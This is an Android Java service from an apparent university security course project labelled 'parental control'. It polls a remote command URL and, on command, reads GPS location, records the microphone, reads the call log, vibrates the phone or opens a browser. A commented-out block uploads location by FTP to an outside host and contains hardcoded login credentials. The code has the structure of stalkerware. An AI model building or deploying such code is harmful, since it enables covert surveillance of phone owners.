package com.seginf.parentalcontrol;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Environment;
import android.os.IBinder;
import android.os.StrictMode;
import android.os.Vibrator;
import android.provider.CallLog;
import android.util.Log;
import android.widget.Toast;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.URL;
import java.net.UnknownHostException;


import org.apache.commons.net.ftp.FTPClient;



public class CommandService extends Service {

    private static boolean isRunning = false;

    @Override
    public void onCreate() {
        Toast.makeText(this, "service created", Toast.LENGTH_LONG).show();
        isRunning = true;
    }

    public static boolean isRunning() {
        return isRunning;
    }

    @Override
    public IBinder onBind(Intent intent) {
        // We don't provide binding, so return null
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        /*if (android.os.Build.VERSION.SDK_INT > 9) {
            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
            StrictMode.setThreadPolicy(policy);
        }*/

        //String urlString = "http://www.deanastasie.com.ar/seginf/pc/command.txt";
        String urlString = "http://10.2.200.89:8000/seginf/pc/command.txt";
        StringBuffer command = new StringBuffer("");

        try {
            URL url = new URL(urlString);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestProperty("User-Agent", "");
            connection.setRequestMethod("GET");
            connection.connect();

            InputStream iStream = connection.getInputStream();
            BufferedReader rd = new BufferedReader(new InputStreamReader(iStream));

            String line = "";
            while ((line = rd.readLine()) != null) {
                command.append(line);
            }

        } catch (IOException e) {
            e.printStackTrace();
        }

        Log.d("** Comando", command.toString());
        Toast.makeText(this, command.toString(), Toast.LENGTH_SHORT).show();

        try{
            switch ( command.toString() ) {
                case "GPS":
                    trackLocation();
                    break;
                case "MIC":
                    startRecording();
                    break;
                case "VIB":
                    vibrate();
                    break;
                case "BROWSER":
                    openUrlInBrowser();
                    break;
                case "CALLS":
                    getCallHistory();
                    break;
                default:
            }
        } catch (InterruptedException e) {
                e.printStackTrace();
            }

        return Service.START_STICKY;
    }


    private void trackLocation() {
        LocationManager locationManager = (LocationManager)
                getSystemService(LOCATION_SERVICE);
        Criteria criteria = new Criteria();
        String bestProvider = locationManager.getBestProvider(criteria, false);
        Location location = locationManager.getLastKnownLocation(bestProvider);


        /*String result  = "Location: " + location.getLongitude() + " " + location.getLatitude();
        byte[] baos = result.getBytes();

        FTPClient ftpClient = new FTPClient();
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);


        try {
            ftpClient.connect(InetAddress.getByName("ftp.deanastasie.com.ar"));
            ftpClient.login("deanastasie", "3rLJskyhsF");
            ftpClient.changeWorkingDirectory("test/fotos/");

            String name = Double.toString(Math.random());

            if (ftpClient.getReplyString().contains("250")) {
                ftpClient.setFileType(org.apache.commons.net.ftp.FTP.BINARY_FILE_TYPE);
                BufferedInputStream buffIn = null;
                InputStream is = new ByteArrayInputStream(baos);
                buffIn = new BufferedInputStream(is);
                ftpClient.enterLocalPassiveMode();
                ftpClient.storeFile(name, buffIn);
                buffIn.close();
                ftpClient.logout();
                ftpClient.disconnect();
            }

        } catch (SocketException e) {
            Log.e("this", e.getStackTrace().toString());
        } catch (UnknownHostException e) {
            Log.e("this", e.getStackTrace().toString());
        } catch (IOException e) {
            Log.e("this", e.getStackTrace().toString());
        }*/






        if (location == null) {
            Toast.makeText(this, "location is null", Toast.LENGTH_SHORT).show();
        } else {
            Toast.makeText(this, location.getLongitude() + " " + location.getLatitude()
                    , Toast.LENGTH_SHORT).show();
        }
    }

    private void openUrlInBrowser() {
        String urlToOpen = "http://www-2.dc.uba.ar/materias/seginf/";
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setData(Uri.parse(urlToOpen));
        // needed because we are opening an activity from a service
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private void vibrate() {
        Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
        // Vibrate for 500 milliseconds
        v.vibrate(10000);
    }

    private void getCallHistory() {
        // query the call log
        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
        String phoneNumber, callType, callDate, callDuration;

        // iterate the cursor and show call log
        while (cursor.moveToNext()) {
            phoneNumber = cursor.getString(number);
            callType = cursor.getString(type);
            callDate = cursor.getString(date);
            callDuration = cursor.getString(duration);
            Log.d("CALL", "Number " + phoneNumber + " - type " + callType + " - date " +
                    callDate + " - duration " + callDuration);
        }

        cursor.close();
    }

    private void startRecording() throws InterruptedException {
        Toast.makeText(this, "start recording", Toast.LENGTH_LONG).show();

        new Thread(new Runnable() {
            @Override
            public void run() {
                MediaRecorder recorder = new MediaRecorder();
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                recorder.setOutputFile(Environment.getExternalStorageDirectory().getAbsolutePath() + "/audiorecordtest.3gp");
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);

                try {
                    recorder.prepare();
                } catch (IOException ignored) {

                }

                recorder.start();

                try {
                    Thread.sleep(5000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

                recorder.stop();
                recorder.release();
            }
        }).run();
    }
}
